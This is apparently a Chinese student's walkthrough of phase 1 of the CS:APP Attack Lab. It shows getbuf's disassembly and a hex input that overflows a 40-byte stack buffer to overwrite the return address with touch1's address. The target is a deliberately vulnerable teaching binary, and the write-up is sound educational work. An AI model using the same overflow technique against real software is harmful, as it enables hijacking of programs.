注意，运行./rtarget或者ctarget可能有问题，加上-q即可

## attack1:

我使用的操作系统是Ubuntu 22.04版本，在这个版本上运行ctarget程序会出现Segmentation Fault。如果你用gdb调试会发现在__vfprintf_internal方法内部有问题，具体修复方法可以参考：[Fix CS:APP Attack Lab Segmentation Fault on Newest Ubuntu 22.04](https://blog.rijuyuezhu.top/posts/db646f34/)。建议使用更老的linux版本。我使用18是没问题的。

请先阅读attacklab.pdf

`hex2raw` 是一个字一个字的读，也就是一次读8个字节，但是字内部是小端，比如attack1.txt：`41 00 00 00 00 00 00 00`

执行./hex2raw < attack1.txt会输出 `A`。`./hex2raw < attack1.txt | ./ctarget -q`我们可以用这个命令执行程序

根据pdf的意思，我们首先要侵入一个程序，让它运行 `4017c0 <touch1>:` 。方法需要你知道栈的运行过程，当我们调用函数的时候，会自动的把程序的返回地址先压入栈中，然后再进入调用的函数，调用完成后返回，示意图如下：

```
[ 返回地址 ]        <--- 函数返回后，跳转到这里执行
[ buffer (x 字节) ]<--- 局部变量，用于存储用户输入
```

我们这个程序是从 `401968 <test>` 函数开始的

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
```

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

getbuf给栈分配了40个字节的空间，40个之后就是返回地址了。所以我们先随便输入40个字节，再把后面的八个字节换成touch1的地址4017C0就成功了。

输入
```
A0 00 00 00 00 00 00 00
B0 00 00 00 00 00 00 00
C0 00 00 00 00 00 00 00
D0 00 00 00 00 00 00 00
E0 00 00 00 00 00 00 00
C0 17 40 00 00 00 00 00
```



